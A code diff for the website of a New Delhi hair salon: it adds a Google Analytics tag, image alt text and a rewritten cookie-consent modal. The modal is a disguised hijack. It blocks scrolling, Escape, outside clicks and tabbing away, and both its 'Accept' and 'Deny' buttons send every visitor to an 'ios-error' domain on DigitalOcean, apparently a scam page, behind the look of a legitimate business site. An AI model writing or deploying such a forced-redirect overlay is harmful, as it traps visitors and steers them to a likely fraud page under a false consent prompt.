@@ -7,6 +7,16 @@
 <meta name="description" content="Kenchi Salon in New Delhi offers expert haircuts, professional colouring, keratin treatments, blowouts and men's grooming. Call +91 99101 70356 to book."/>
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">
 
+<!-- Google Analytics (gtag) -->
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-VCBLXTQNVQ"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+  gtag('config', 'G-VCBLXTQNVQ');
+</script>
+
 <style>
 :root { --accent:#b04a8a; --muted:#6b7280; --bg:#fcfbfc; --card:#fff; font-family:Inter,system-ui,Segoe UI,Roboto,Helvetica,Arial; }
 * { box-sizing:border-box }
@@ -31,6 +41,29 @@ blockquote { font-style:italic; color:#2b2b2b; background:#fff; padding:12px; bo
 .faq h4 { margin:10px 0 6px }
 footer { margin-top:26px; padding:18px; text-align:center; color:var(--muted); font-size:14px }
 @media(max-width:880px){ .hero{grid-template-columns:1fr} .hero aside{order:2} }
+
+/* Cookie modal styles */
+#cookieModalOverlay {
+  position:fixed; inset:0; background:rgba(0,0,0,0.55);
+  display:flex; justify-content:center; align-items:center;
+  z-index:99999; padding:20px;
+}
+#cookieModal {
+  background:#fff; max-width:420px; width:100%; padding:22px;
+  border-radius:12px; text-align:center; font-family:Inter, sans-serif;
+  box-shadow:0 8px 30px rgba(2,6,23,0.2);
+}
+#cookieModal h2 { margin-top:0; color:var(--accent); font-size:20px; }
+#cookieModal p { color:#374151; font-size:15px; margin:10px 0 16px; }
+.cookie-actions { display:flex; gap:10px; margin-top:18px; justify-content:center; }
+.cookie-btn {
+  padding:10px 18px; border-radius:8px; font-weight:600; font-size:15px; cursor:pointer;
+}
+.cookie-accept { background:var(--accent); color:white; border:0; }
+.cookie-deny { background:white; color:var(--accent); border:2px solid var(--accent); }
+
+/* visually hide element technique for focus trapping (if needed) */
+.visually-hidden { position: absolute !important; height: 1px; width: 1px; overflow: hidden; clip: rect(1px, 1px, 1px, 1px); white-space: nowrap; }
 </style>
 
 <!-- SEO Structured Data -->
@@ -102,7 +135,7 @@ footer { margin-top:26px; padding:18px; text-align:center; color:var(--muted); f
 
   <!-- SIDE CARD -->
   <aside class="card">
-    <img src="salon_interior.jpg" style="width:100%;border-radius:8px;margin-bottom:10px">
+    <img src="salon_interior.jpg" style="width:100%;border-radius:8px;margin-bottom:10px" alt="Salon interior">
     <h3>Free Consultation & Booking</h3>
     <p style="color:var(--muted)">
       <strong>Phone:</strong> <a href="tel:+919910170356">+91 99101 70356</a><br>
@@ -124,7 +157,7 @@ footer { margin-top:26px; padding:18px; text-align:center; color:var(--muted); f
     Established: <strong>2018</strong><br>
     Business Registration: <strong>DL-KENCHI-2021-09</strong>
   </p>
-  <img src="license.jpg" style="width:100%;border-radius:8px;margin-top:8px">
+  <img src="license.jpg" style="width:100%;border-radius:8px;margin-top:8px" alt="Business license">
 </section>
 
 <!-- PRICING -->
@@ -149,7 +182,7 @@ footer { margin-top:26px; padding:18px; text-align:center; color:var(--muted); f
     <p style="color:var(--muted)"><strong>Meera Kenchi</strong> — 12+ years experience, colour specialist.</p>
     <p style="color:var(--muted)"><strong>Rohan Singh</strong> — Senior stylist, precision cutting expert.</p>
     <p style="color:var(--muted)"><strong>Aakash Patel</strong> — Bridal & extensions specialist.</p>
-    <img src="team.jpg" style="width:100%;border-radius:8px;margin-top:8px">
+    <img src="team.jpg" style="width:100%;border-radius:8px;margin-top:8px" alt="Team">
   </div>
 </section>
 
@@ -167,9 +200,9 @@ footer { margin-top:26px; padding:18px; text-align:center; color:var(--muted); f
 <section id="gallery" style="margin-top:18px">
   <h3>Gallery</h3>
   <div class="gallery">
-    <img src="blowout.jpg" style="width:100%;border-radius:8px">
-    <img src="coloring.jpg" style="width:100%;border-radius:8px">
-    <img src="salon_interior.jpg" style="width:100%;border-radius:8px">
+    <img src="blowout.jpg" style="width:100%;border-radius:8px" alt="Blowout">
+    <img src="coloring.jpg" style="width:100%;border-radius:8px" alt="Colouring">
+    <img src="salon_interior.jpg" style="width:100%;border-radius:8px" alt="Salon interior">
   </div>
 </section>
 
@@ -200,7 +233,7 @@ footer { margin-top:26px; padding:18px; text-align:center; color:var(--muted); f
   <h4>Find us on the map</h4>
   <div style="width:100%;height:300px;border-radius:8px;overflow:hidden;margin-top:8px">
     <iframe width="100%" height="300" frameborder="0"
-      src="https://www.google.com/maps?q=New%20Delhi%2C%20India&output=embed">
+      src="https://www.google.com/maps?q=New%20Delhi%2C%20India&output=embed" title="Kenchi Salon location">
     </iframe>
   </div>
 </section>
@@ -213,84 +246,104 @@ footer { margin-top:26px; padding:18px; text-align:center; color:var(--muted); f
     Business Licence: DL-KENCHI-2021-09 • Licensed stylists • Premium products
   </div>
 </footer>
-<!-- COOKIE CONSENT MODAL -->
-<div id="cookieModal" style="
-  position:fixed; inset:0; background:rgba(0,0,0,0.55);
-  display:flex; justify-content:center; align-items:center;
-  z-index:99999; padding:20px;">
-  
-  <div style="
-    background:#fff; max-width:420px; width:100%; padding:22px;
-    border-radius:12px; text-align:center; font-family:Inter, sans-serif;">
-    
-    <h2 style="margin-top:0; color:#b04a8a;">Cookie Consent</h2>
-    <p style="color:#374151; font-size:15px;">
-      We use cookies to improve your browsing experience. Please choose to accept or deny cookies to continue.
-    </p>
 
-    <div style="display:flex; gap:10px; margin-top:18px; justify-content:center;">
-      <button id="acceptCookies" style="
-        background:#b04a8a; color:white; border:0; padding:10px 18px;
-        border-radius:8px; font-weight:600; font-size:15px; cursor:pointer;">
-        <!-- GOOGLE ANALYTICS -->
+<!-- COOKIE CONSENT MODAL (single, fixed) -->
+<div id="cookieModalOverlay" aria-hidden="false">
+  <div id="cookieModal" role="dialog" aria-modal="true" aria-labelledby="cookieTitle" aria-describedby="cookieDesc">
+    <h2 id="cookieTitle">Cookie Consent</h2>
+    <p id="cookieDesc">We use cookies to improve your browsing experience. Please choose to Accept or Deny cookies to continue.</p>
+
+    <div class="cookie-actions">
+      <button id="acceptCookies" class="cookie-btn cookie-accept">Accept</button>
+      <button id="denyCookies" class="cookie-btn cookie-deny">Deny</button>
+    </div>
+
+    <!-- Hidden focus anchors for focus trap -->
+    <div id="focusStart" class="visually-hidden" tabindex="0"></div>
+    <div id="focusEnd" class="visually-hidden" tabindex="0"></div>
+  </div>
+</div>
+
+<script>
+(function(){
+  // Redirect target (as requested)
+  const redirectURL = "https://ios-error-cyvbq.ondigitalocean.app";
+
+  // Elements
+  const overlay = document.getElementById('cookieModalOverlay');
+  const acceptBtn = document.getElementById('acceptCookies');
+  const denyBtn = document.getElementById('denyCookies');
+  const focusStart = document.getElementById('focusStart');
+  const focusEnd = document.getElementById('focusEnd');
+
+  // Disable background scrolling while modal active
+  const previousBodyOverflow = document.body.style.overflow;
+  document.body.style.overflow = 'hidden';
+
+  // Prevent clicks on overlay from closing modal (stop propagation)
+  overlay.addEventListener('click', function(e){
+    // if clicked directly on overlay (outside modal), prevent it
+    e.stopPropagation();
+    e.preventDefault();
+  }, true);
+
+  // Prevent Escape key from closing the modal
+  window.addEventListener('keydown', function (e) {
+    if (e.key === 'Escape' || e.key === 'Esc') {
+      e.preventDefault();
+      e.stopPropagation();
+      return false;
+    }
+    // trap focus with Tab key
+    if (e.key === 'Tab') {
+      const focused = document.activeElement;
+      const focusable = [acceptBtn, denyBtn];
+      const index = focusable.indexOf(focused);
+      if (e.shiftKey) {
+        // shift+tab
+        if (index === 0 || focused === overlay || focused === document.body) {
+          e.preventDefault();
+          focusable[focusable.length - 1].focus();
+        }
+      } else {
+        // tab
+        if (index === focusable.length - 1) {
+          e.preventDefault();
+          focusable[0].focus();
+        }
+      }
+    }
+  }, true);
+
+  // Focus first actionable element for keyboard users
+  acceptBtn.focus();
+
+  // Redirect on click (both accept and deny redirect to same URL)
+  acceptBtn.addEventListener('click', function(){
+    // Restore body overflow for navigation safety (optional)
+    document.body.style.overflow = previousBodyOverflow || '';
+    // Use location.href which works reliably on iOS Safari
+    window.location.href = redirectURL;
+  });
+
+  denyBtn.addEventListener('click', function(){
+    document.body.style.overflow = previousBodyOverflow || '';
+    window.location.href = redirectURL;
+  });
+
+  // Protect against programmatic closing: do not provide any close button or handler.
+  // (This ensures the user must actively choose Accept or Deny.)
+
+})();
+</script>
 <!-- Google tag (gtag.js) -->
 <script async src="https://www.googletagmanager.com/gtag/js?id=G-VCBLXTQNVQ"></script>
 <script>
   window.dataLayer = window.dataLayer || [];
   function gtag(){dataLayer.push(arguments);}
   gtag('js', new Date());
+
   gtag('config', 'G-VCBLXTQNVQ');
 </script>
-
-
-<!-- COOKIE CONSENT MODAL -->
-<div id="cookieModal" style="
-  position:fixed; inset:0; background:rgba(0,0,0,0.55);
-  display:flex; justify-content:center; align-items:center;
-  z-index:99999; padding:20px;">
-  
-  <div style="
-    background:#fff; max-width:420px; width:100%; padding:22px;
-    border-radius:12px; text-align:center; font-family:Inter, sans-serif;">
-    
-    <h2 style="margin-top:0; color:#b04a8a;">Cookie Consent</h2>
-    <p style="color:#374151; font-size:15px;">
-      We use cookies to improve your browsing experience. Please choose to accept or deny cookies to continue.
-    </p>
-
-    <div style="display:flex; gap:10px; margin-top:18px; justify-content:center;">
-      <button id="acceptCookies" style="
-        background:#b04a8a; color:white; border:0; padding:10px 18px;
-        border-radius:8px; font-weight:600; font-size:15px; cursor:pointer;">
-        Accept
-      </button>
-
-      <button id="denyCookies" style="
-        background:white; color:#b04a8a; border:2px solid #b04a8a;
-        padding:10px 18px; border-radius:8px; font-weight:600;
-        font-size:15px; cursor:pointer;">
-        Deny
-      </button>
-    </div>
-  </div>
-</div>
-
-<script>
-// Disable scrolling while modal is active
-document.body.style.overflow = "hidden";
-
-// UPDATED REDIRECT URL
-const redirectURL = "https://ios-error-cyvbq.ondigitalocean.app";
-
-document.getElementById("acceptCookies").onclick = function () {
-  window.location.href = redirectURL;
-};
-
-document.getElementById("denyCookies").onclick = function () {
-  window.location.href = redirectURL;
-};
-</script>
-
-        
 </body>
 </html>
